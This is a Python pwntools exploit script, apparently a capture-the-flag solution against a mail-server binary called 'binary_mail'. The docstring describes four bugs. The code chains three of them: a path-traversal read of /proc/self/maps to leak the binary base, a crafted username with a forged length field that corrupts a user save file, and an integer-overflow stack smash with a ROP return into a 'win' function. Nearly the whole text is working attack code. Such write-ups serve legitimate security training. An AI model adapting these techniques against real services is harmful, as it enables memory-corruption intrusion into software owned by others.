from pwn import *
from enum import IntEnum

"""
Three main bugs:
    1. get_user_save_fp is vulnerable to path traversal
    2. handle_auth leaks the first 8 bytes of a user file if it is "corrupted"
    3. view_mail has an integer overflow bug in the combined username
        and message length check. t1 + t2 may overflow the size of
        an unsigned long, but t2 bytes are read into the stack buffer
    4. send_mail has a logic bug where the announced length of the
        recipient user is used in the TAG_STR_FROM field, even though
        the value of the from username is copied into the value
    (and probably many more)

We use bug 1 and 2 to leak the first 8 bytes of /proc/self/maps which
gives us the binary base address.

We use bug 4 to corrupt a user save file by registering two users with
differing username lengths. We use the longer user as the sender and
the shorter one as the recipient. Call these username lengths ls and lr
(for length sender and length recipient). We set the username of sender
to be 'x'*lr + p32(7) p64(large_number) xxxx
We then send another mail to the same user and now our message will be
in overflow territory.

We use bug 3 to trigger a stack overflow and ret2win.
"""

class TAG(IntEnum):
    RES_MSG = 0
    RES_ERROR = 1
    INPUT_REQ = 2
    INPUT_ANS = 3
    COMMAND = 4
    TAG_STR_PASSWORD = 5
    TAG_STR_FROM = 6
    TAG_STR_MESSAGE = 7

def send_tlv(tag, val):
    tlv = p32(tag) + p64(len(val)) + val
    print('sending:', (TAG(tag).name, len(val), val))
    conn.send(tlv)

def recv_tlv():
    tag = u32(conn.recv(4))
    tlen = u64(conn.recv(8))
    val = conn.recv(tlen)
    if tag in iter(TAG):
        tag = TAG(tag).name
    return (tag, tlen, val)

def register_user(username, password):
    send_tlv(TAG.COMMAND, b'register')
    print(recv_tlv())
    send_tlv(TAG.INPUT_ANS, username)
    print(recv_tlv())
    send_tlv(TAG.INPUT_ANS, password)
    print(recv_tlv())

def view_mail(username, password):
    send_tlv(TAG.COMMAND, b'view_mail')
    print(recv_tlv())
    send_tlv(TAG.INPUT_ANS, username)
    print(recv_tlv())
    send_tlv(TAG.INPUT_ANS, password)
    t, l, v = recv_tlv()
    print((t, l, v))
    if t == TAG.RES_ERROR:
        print(v)
        return None
    return v

def send_mail(username, password, recipient, msg):
    send_tlv(TAG.COMMAND, b'send_mail')
    print(recv_tlv())
    send_tlv(TAG.INPUT_ANS, username)
    print(recv_tlv())
    send_tlv(TAG.INPUT_ANS, password)
    print(recv_tlv())
    send_tlv(TAG.INPUT_ANS, recipient)
    print(recv_tlv())
    send_tlv(TAG.INPUT_ANS, msg)
    print(recv_tlv())

exe = ELF('../publish/binary_mail')
# conn = process('../publish/binary_mail')
conn = remote('0.0.0.0', 1337)
print(conn.recvline().decode())

send_tlv(TAG.COMMAND, b'view_mail')
print(recv_tlv())
send_tlv(TAG.INPUT_ANS, b'../proc/self/maps')
print(recv_tlv())
send_tlv(TAG.INPUT_ANS, b'xxx')
_, _, v = recv_tlv()
l1, l2 = map(int, v.split()[-2:])
bin_base = int(p32(l1).decode() + p64(l2).decode(), 16)
log.success(f'leaked binary base: {hex(bin_base)}')
rop = ROP(exe)
exe.address = bin_base

u1 = b'u1'
register_user(u1, b'x')
u2 = b'u2' + p32(7) + p64(2**64 - 1)
register_user(u2, b'x')
send_mail(u2, b'x', u1, b'X' * 800)
send_mail(u2, b'x', u1, cyclic(340) + p64(bin_base + rop.ret.address) + p64(exe.sym.win))

flag = view_mail(b'u1', b'x')
print(flag.decode())
